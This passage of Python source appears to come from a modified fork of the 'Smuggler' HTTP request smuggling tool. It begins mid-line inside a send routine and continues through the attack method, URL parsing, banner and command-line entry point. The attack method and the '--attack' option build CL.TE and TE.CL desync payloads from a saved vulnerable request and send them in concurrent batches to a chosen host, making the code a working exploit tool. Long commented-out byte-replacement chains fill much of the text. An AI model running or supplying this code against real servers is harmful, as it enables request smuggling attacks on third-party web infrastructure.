xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
#			print(bytes(str(payload),'utf-8'))
			sleep(0.5)
			res = web.recv_nb(self._timeout)
			web.close()
			smuggled=1
			if "Content-Length: 11" in str(payload) or "Content-Length: 5" in str(payload):
				smuggled=0
			if res is not None :
				x="None"
				a=re.search(r"Content-Length:(.*?)\\", str(res),re.IGNORECASE)
				if a:
					x=a.group(0)[:-1]
				print(str(smuggled),str(res[0:40]),"SIZE:"+str(len(res)),x)
				if Smuggled_Host in str(res):
					print(Smuggled_Host+" is here!")

#			if len(res) < 1500:
#				random_n=str(random.random())
#				if self.ssl_flag:
#					scheme="https"
#				else:
#					scheme="http"
#				output_file="/var/www/html/"+scheme+"_"+self._host+"_"+str(self._port)+"/"+scheme+"_"+self._host+"_"+str(self._port)+random_n+".html"
#				with open(output_file,'wb') as file:
#					file.write(res)
#				os.system("gowitness --disable-logging single -P /var/www/html/"+scheme+"_"+self._host+"_"+str(self._port)+"/ -o "+scheme+"_"+self._host+"_"+str(self._port)+random_n+".png http://127.0.0.1/"+scheme+"_"+self._host+"_"+str(self._port)+"/"+scheme+"_"+self._host+"_"+str(self._port)+random_n+".html")



		except Exception as exception_data:
			print(exception_data)
			exit(1)

	def parse_fname(self,file):
		if "__CLTE" in file:
			breaker="__CLTE"
		else:
			breaker="__TECL"
		target=file.split(breaker)
		self._httpversion=target[1][0:3]
		values=target[0].split("_")
#		print(values)
		if values[0]=="https":
			self.ssl_flag=True
		else:
			self.ssl_flag=False
		self._port=int(values[-1])
		self._host='.'.join(values[1:-1])
#		print(self.ssl_flag,self._port,self._host,self._httpversion)
		return True

	def attack(self,file):
		RN="\r\n"
		if not os.path.exists(file):
			pretty_print("File "+file+" doesnt exist.")
			exit(1)
		else:
			with open(file,'rb') as f:
				payload_obj=f.read().decode("utf-8")
#				print(payload_obj)
		p=Payload()
		p.host = self._host
#		print(payload_obj)
		attack_list=[]
		target=file.split('/')[-1]
#		values=target.split("__CLTE")
#		if target[0:4] == "https"
#			values[1]=values[1].replace("https_","https://")
#		else:
#			values[1]=
		self.parse_fname(target)
		p.method="POST"
		p.endpoint=self._endpoint
		code,resp,payl=self._test(str(payload_obj))
		if code == 1:
			print("Vulnerable")
		else:
			print("Not vulnerable")
			exit(1)

		if "__CLTE" in file:
#			p.method="POST"
#			p.endpoint=self._endpoint
#			print(payload_obj[:-8].split('\n'))
#			code,resp,payl=self._test(str(payload_obj))
#			if code == 1:
#				print("Vulnerable")
#				self._test(str(payload_obj).replace("\n","\r\n").replace("Content-length"))
#			else:
#				print("Not vulnerable")
#				exit(1)
			p.header=payload_obj[:-13].replace("Content-Length: 4","Content-Length: 11")
			p.body=Chunked('X')+EndChunk
#			p.header.replace("Content-Length: 4","Content-length: 0")
			for n in range(1,3):
				attack_list.append(p)

			for pld in Payloads_CLTE:
				for httpv in http_version:
					if "__DIR__" in pld:
						for dir in smuggle_dir:
							malicious=deepcopy(p)
#						print(binascii.hexlify(str(p).encode()))


#			p.cl=11
#			p.body=''
#			self.make_poc(p)
#			print(binascii.hexlify(str(p).encode()))
#			malicious = deepcopy(str(p))
#			print(malicious)
#			m_heades="GET /robots.txt HTTP/"+self._httpversion+RN"
#			from config.attack import *

							malicious.body += pld.replace("__DIR__",dir).replace("__HTTP_VERSION__",httpv).replace("__HOST__",self._host)
#			malicious.body += "X: X"
							malicious.header=str(p.header).replace("Content-Length: 11","Content-Length: "+str(len(malicious.body)))
#						print(str(malicious))

							attack_list.append(malicious)
							for n in range(1,3):
								attack_list.append(p)
					else:
						malicious=deepcopy(p)
						malicious.body += pld.replace("__HTTP_VERSION__",httpv).replace("__HOST__",self._host)
						malicious.header=str(p.header).replace("Content-Length: 11","Content-Length: "+str(len(malicious.body)))
						attack_list.append(malicious)
#					print(str(malicious))
						for n in range(1,3):
							attack_list.append(p)

#			for n in range(1,5):
#				attack_list.append(p)
#			p.headers=str(p).replace("Content-Length: 4","Content-Length: 11")
#			for n in range(1,3):
#				attack_list.append(str(malicious))
		else:
			p.header=payload_obj[:-8].replace("Content-Length: 6","Content-Length: 5")
			p.body=EndChunk
#			print(str(p))
			for n in range(1,5):
				attack_list.append(p)
			for pld in Payloads_TECL:
				for httpv in http_version:
					if "__DIR__" in pld:
						for dir in smuggle_dir:
							malicious=deepcopy(p)
							malicious.body = Chunked(pld.replace("__DIR__",dir).replace("__HTTP_VERSION__",httpv).replace("__HOST__",self._host))+EndChunk
							malicious.header=str(p.header).replace("Content-Length: 5","Content-Length: 4")
#						print(str(malicious))
							attack_list.append(malicious)
							for n in range(1,3):
								attack_list.append(p)
					else:
						malicious=deepcopy(p)
						malicious.body = Chunked(pld.replace("__HTTP_VERSION__",httpv).replace("__HOST__",self._host))+EndChunk
						malicious.header=str(p.header).replace("Content-Length: 5","Content-Length: 4")
						attack_list.append(malicious)
#					print(str(malicious))
						for n in range(1,3):
							attack_list.append(p)

		for n in range(1,15):
			attack_list.append(p)
#			for atta in attack_list:
#				print(atta)
#			print(attack_list)
#			print(str(malicious))
#			print(p.cl)
#			p.body='a'
#			cookies=self._cookies
#			print(binascii.hexlify(str(p)))
		if self.ssl_flag:
			scheme="https"
		else:
			scheme="http"
#		os.system("mkdir /var/www/html/"+scheme+"_"+self._host+"_"+str(self._port))
		with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
			future_to_smuggle={executor.submit(self.make_poc, req): req for req in attack_list}
#			print(future_to_smuggle)
			for future in concurrent.futures.as_completed(future_to_smuggle):
				smuggle=future_to_smuggle[future]
				try:
					data = future.result()
				except Exception as exc:
					print(exc)
				else:
					continue




#		try:
#			web = EasySSL(self.ssl_flag)
#			print(str(p).encode("utf-8").hex())
#			print(str(p).encode("utf-8").hex())
#			print(self._host, self._port, self._timeout,self.ssl_flag)
#			web.connect(self._host, self._port, self._timeout)
#			print(self._host, self._port, self._timeout,self.ssl_flag)
#			print('teste')
#			sleep(0.1)
#			print(str(p))
#.replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
#			web.send(str(p).encode().replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
#			print(str(p).encode().replace(b'\xc2\x80',b'\x80').replace(b'\xc2\x81',b'\x81').replace(b'\xc2\x82',b'\x82').replace(b'\xc2\x83',b'\x83').replace(b'\xc2\x84',b'\x84').replace(b'\xc2\x85',b'\x85').replace(b'\xc2\x86',b'\x86').replace(b'\xc2\x87',b'\x87').replace(b'\xc2\x88',b'\x88').replace(b'\xc2\x89',b'\x89').replace(b'\xc2\x8a',b'\x8a').replace(b'\xc2\x8b',b'\x8b').replace(b'\xc2\x8c',b'\x8c').replace(b'\xc2\x8d',b'\x8d').replace(b'\xc2\x8e',b'\x8e').replace(b'\xc2\x8f',b'\x8f').replace(b'\xc2\x90',b'\x90').replace(b'\xc2\x91',b'\x91').replace(b'\xc2\x92',b'\x92').replace(b'\xc2\x93',b'\x93').replace(b'\xc2\x94',b'\x94').replace(b'\xc2\x95',b'\x95').replace(b'\xc2\x96',b'\x96').replace(b'\xc2\x97',b'\x97').replace(b'\xc2\x98',b'\x98').replace(b'\xc2\x99',b'\x99').replace(b'\xc2\x9a',b'\x9a').replace(b'\xc2\x9b',b'\x9b').replace(b'\xc2\x9c',b'\x9c').replace(b'\xc2\x9d',b'\x9d').replace(b'\xc2\x9e',b'\x9e').replace(b'\xc2\x9f',b'\x9f').replace(b'\xc2\xa0',b'\xa0').replace(b'\xc2\xa1',b'\xa1').replace(b'\xc2\xa2',b'\xa2').replace(b'\xc2\xa3',b'\xa3').replace(b'\xc2\xa4',b'\xa4').replace(b'\xc2\xa5',b'\xa5').replace(b'\xc2\xa6',b'\xa6').replace(b'\xc2\xa7',b'\xa7').replace(b'\xc2\xa8',b'\xa8').replace(b'\xc2\xa9',b'\xa9').replace(b'\xc2\xaa',b'\xaa').replace(b'\xc2\xab',b'\xab').replace(b'\xc2\xac',b'\xac').replace(b'\xc2\xad',b'\xad').replace(b'\xc2\xae',b'\xae').replace(b'\xc2\xaf',b'\xaf').replace(b'\xc2\xb0',b'\xb0').replace(b'\xc2\xb1',b'\xb1').replace(b'\xc2\xb2',b'\xb2').replace(b'\xc2\xb3',b'\xb3').replace(b'\xc2\xb4',b'\xb4').replace(b'\xc2\xb5',b'\xb5').replace(b'\xc2\xb6',b'\xb6').replace(b'\xc2\xb7',b'\xb7').replace(b'\xc2\xb8',b'\xb8').replace(b'\xc2\xb9',b'\xb9').replace(b'\xc2\xba',b'\xba').replace(b'\xc2\xbb',b'\xbb').replace(b'\xc2\xbc',b'\xbc').replace(b'\xc2\xbd',b'\xbd').replace(b'\xc2\xbe',b'\xbe').replace(b'\xc2\xbf',b'\xbf').replace(b'\xc3\x80',b'\xc0').replace(b'\xc3\x81',b'\xc1').replace(b'\xc3\x82',b'\xc2').replace(b'\xc3\x83',b'\xc3').replace(b'\xc3\x84',b'\xc4').replace(b'\xc3\x85',b'\xc5').replace(b'\xc3\x86',b'\xc6').replace(b'\xc3\x87',b'\xc7').replace(b'\xc3\x88',b'\xc8').replace(b'\xc3\x89',b'\xc9').replace(b'\xc3\x8a',b'\xca').replace(b'\xc3\x8b',b'\xcb').replace(b'\xc3\x8c',b'\xcc').replace(b'\xc3\x8d',b'\xcd').replace(b'\xc3\x8e',b'\xce').replace(b'\xc3\x8f',b'\xcf').replace(b'\xc3\x90',b'\xd0').replace(b'\xc3\x91',b'\xd1').replace(b'\xc3\x92',b'\xd2').replace(b'\xc3\x93',b'\xd3').replace(b'\xc3\x94',b'\xd4').replace(b'\xc3\x95',b'\xd5').replace(b'\xc3\x96',b'\xd6').replace(b'\xc3\x97',b'\xd7').replace(b'\xc3\x98',b'\xd8').replace(b'\xc3\x99',b'\xd9').replace(b'\xc3\x9a',b'\xda').replace(b'\xc3\x9b',b'\xdb').replace(b'\xc3\x9c',b'\xdc').replace(b'\xc3\x9d',b'\xdd').replace(b'\xc3\x9e',b'\xde').replace(b'\xc3\x9f',b'\xdf').replace(b'\xc3\xa0',b'\xe0').replace(b'\xc3\xa1',b'\xe1').replace(b'\xc3\xa2',b'\xe2').replace(b'\xc3\xa3',b'\xe3').replace(b'\xc3\xa4',b'\xe4').replace(b'\xc3\xa5',b'\xe5').replace(b'\xc3\xa6',b'\xe6').replace(b'\xc3\xa7',b'\xe7').replace(b'\xc3\xa8',b'\xe8').replace(b'\xc3\xa9',b'\xe9').replace(b'\xc3\xaa',b'\xea').replace(b'\xc3\xab',b'\xeb').replace(b'\xc3\xac',b'\xec').replace(b'\xc3\xad',b'\xed').replace(b'\xc3\xae',b'\xee').replace(b'\xc3\xaf',b'\xef').replace(b'\xc3\xb0',b'\xf0').replace(b'\xc3\xb1',b'\xf1').replace(b'\xc3\xb2',b'\xf2').replace(b'\xc3\xb3',b'\xf3').replace(b'\xc3\xb4',b'\xf4').replace(b'\xc3\xb5',b'\xf5').replace(b'\xc3\xb6',b'\xf6').replace(b'\xc3\xb7',b'\xf7').replace(b'\xc3\xb8',b'\xf8').replace(b'\xc3\xb9',b'\xf9').replace(b'\xc3\xba',b'\xfa').replace(b'\xc3\xbb',b'\xfb').replace(b'\xc3\xbc',b'\xfc').replace(b'\xc3\xbd',b'\xfd').replace(b'\xc3\xbe',b'\xfe').replace(b'\xc3\xbf',b'\xff'))
	#		print(str(p))
#			sleep(0.5)
#			res = web.recv_nb(self._timeout)
#			web.close()
#			print(res)
#			print(len(res))
#		except Exception as exception_data:
#			print(exception_data)
#			exit(1)
#			return (-1, None, payload_obj)

def process_uri(uri):
	#remove shouldering white spaces and go lowercase
	uri = uri.strip().lower()

	#if it starts with https:// then strip it
	if ((len(uri) > 8) and (uri[0:8] == "https://")):
		uri = uri[8:]
		ssl_flag = True
		std_port = 443
	elif ((len(uri) > 7) and (uri[0:7] == "http://")):
		uri = uri[7:]
		ssl_flag = False
		std_port = 80
	else:
		print_info("Error malformed URL not supported: %s" % (Fore.CYAN + uri))
		exit(1)

	#check for any forward slashes and filter only domain portion
	uri_tokenized = uri.split("/")
	uri = uri_tokenized[0]
	smendpoint = '/' + '/'.join(uri_tokenized[1:])

	#check for any port designators
	uri = uri.split(":")

	if len(uri) > 1:
		return (uri[0], int(uri[1]), smendpoint, ssl_flag)

	return (uri[0], std_port, smendpoint, ssl_flag)

def CF(text):
	global NOCOLOR
	if NOCOLOR:
		ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
		text = ansi_escape.sub('', text)
	return text

def banner(sm_version):
	print(CF(Fore.CYAN))
	print(CF(r"  ______                         _              "))
	print(CF(r" / _____)                       | |             "))
	print(CF(r"( (____  ____  _   _  ____  ____| | _____  ____ "))
	print(CF(r" \____ \|    \| | | |/ _  |/ _  | || ___ |/ ___)"))
	print(CF(r" _____) ) | | | |_| ( (_| ( (_| | || ____| |    "))
	print(CF(r"(______/|_|_|_|____/ \___ |\___ |\_)_____)_|    "))
	print(CF(r"                    (_____(_____|               "))
	print(CF(r""))
	print(CF(r"     @defparam                         %s"%(sm_version)))
	print(CF(Style.RESET_ALL))

def print_info(msg, file_handle=None):
	ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
	msg = Style.BRIGHT + Fore.MAGENTA + "[%s] %s"%(Fore.CYAN+'+'+Fore.MAGENTA, msg) + Style.RESET_ALL
	plaintext = ansi_escape.sub('', msg)
	print(CF(msg))
	if file_handle is not None:
		file_handle.write(plaintext+"\n")

if __name__ == "__main__":
	global NOCOLOR
	if sys.version_info < (3, 0):
		print("Error: Smuggler requires Python 3.x")
		sys.exit(1)

	Parser = argparse.ArgumentParser()
	Parser.add_argument('-u', '--url', help="Target URL with Endpoint")
	Parser.add_argument('-v', '--vhost', default="", help="Specify a virtual host")
	Parser.add_argument('-x', '--exit_early', action='store_true',help="Exit scan on first finding")
	Parser.add_argument('-m', '--method', default="POST", help="HTTP method to use (e.g GET, POST) Default: POST")
	Parser.add_argument('-l', '--log', help="Specify a log file")
	Parser.add_argument('--json', help="Specify a JSON output file")
	Parser.add_argument('-q', '--quiet', action='store_true', help="Quiet mode will only log issues found")
	Parser.add_argument('-t', '--timeout', default=5.0, help="Socket timeout value Default: 5")
	Parser.add_argument('--no-color', action='store_true', help="Suppress color codes")
	Parser.add_argument('-c', '--configfile', default="default.py", help="Filepath to the configuration file of payloads")
	Parser.add_argument('-p','--httpversion', default="1.1", help="Version http to request")
	Parser.add_argument('-a','--attack', action='store_true', help='Attack Test')
	Parser.add_argument('-f','--file',default='',help='File with vulnerable request')
	Args = Parser.parse_args()  # returns data from the options specified (echo)

	NOCOLOR = Args.no_color
	if os.name == 'nt':
		NOCOLOR = True

	Version = "v1.1"
	banner(Version)

	if sys.version_info < (3, 0):
		print_info("Error: Smuggler requires Python 3.x")
		sys.exit(1)

	# If the URL argument is not specified then check stdin
	if Args.url is None:
		if sys.stdin.isatty():
			print_info("Error: no direct URL or piped URL specified\n")
			Parser.print_help()
			exit(1)
		Servers = sys.stdin.read().split("\n")
	else:
		Servers = [Args.url + " " + Args.method]

	FileHandle = None
	JsonHandle = None
	
	if Args.log is not None:
		try:
			FileHandle = open(Args.log, "w")
		except:
			print_info("Error: Issue with log file destination")
			print(Parser.print_help())
			sys.exit(1)
			
	if Args.json is not None:
		try:
			JsonHandle = open(Args.json, "w")
		except:
			print_info("Error: Issue with JSON file destination")
			print(Parser.print_help())
			sys.exit(1)

	for server in Servers:
		# If the next on the list is blank, continue
		if server == "":
			continue
		# Tokenize
		server = server.split(" ")

		# This is for the stdin case, if no method was specified default to GET
		if len(server) == 1:
			server += [Args.method]

		# If a protocol is not specified then default to https
		if server[0].lower().strip()[0:4] != "http":
			server[0] = "https://" + server[0]

		params = process_uri(server[0])
		method = server[1].upper()
		host = params[0]
		port = params[1]
		endpoint = params[2]
		SSLFlagval = params[3]
		configfile = Args.configfile
		httpversion = Args.httpversion
		print_info("URL        : %s"%(Fore.CYAN + server[0]), FileHandle)
		print_info("Method     : %s"%(Fore.CYAN + method), FileHandle)
		print_info("Version    : %s"%(Fore.CYAN + httpversion), FileHandle)
		print_info("Endpoint   : %s"%(Fore.CYAN + endpoint), FileHandle)
		print_info("Configfile : %s"%(Fore.CYAN + configfile), FileHandle)
		print_info("Timeout    : %s"%(Fore.CYAN + str(float(Args.timeout)) + Fore.MAGENTA + " seconds"), FileHandle)

		sm = Desyncr(configfile, host, port, url=server[0], method=method, httpversion=httpversion ,endpoint=endpoint, SSLFlag=SSLFlagval, logh=FileHandle, jsonh=JsonHandle, smargs=Args)
		if Args.attack:
			sm.attack(Args.file)
		else:
			sm.run()


	if FileHandle is not None:
		FileHandle.close()
		
	if JsonHandle is not None:
		JsonHandle.close()
